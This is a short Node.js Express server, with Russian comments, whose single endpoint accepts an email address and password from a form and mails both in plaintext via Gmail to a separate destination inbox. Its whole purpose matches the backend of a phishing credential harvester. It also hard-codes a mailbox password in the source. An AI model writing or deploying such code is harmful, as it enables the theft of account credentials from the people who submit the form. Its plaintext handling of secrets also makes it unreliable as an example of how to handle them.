const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();

// Настройки Nodemailer
const transporter = nodemailer.createTransport({
  service: 'Gmail',
  auth: {
    user: 'your_email@gmail.com', // моя электронная почта
    pass: 'your_email_password' // пароль моей электронной почты
  }
});

app.use(bodyParser.json());

app.post('/send-email', (req, res) => {
  const { email, password } = req.body;

  const mailOptions = {
    from: 'your_email@gmail.com', // моя электронная почта
    to: 'your_destination_email@gmail.com', // куда хочу отправить электронная почта
    subject: 'Form Data',
    text: `Email: ${email}, Password: ${password}`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).json({ success: false, error: 'Error sending email' });
    } else {
      console.log('Email sent: ' + info.response);
      res.json({ success: true });
    }
  });
});

app.listen(3000, () => {
  console.log('Server is running on port 3000');
});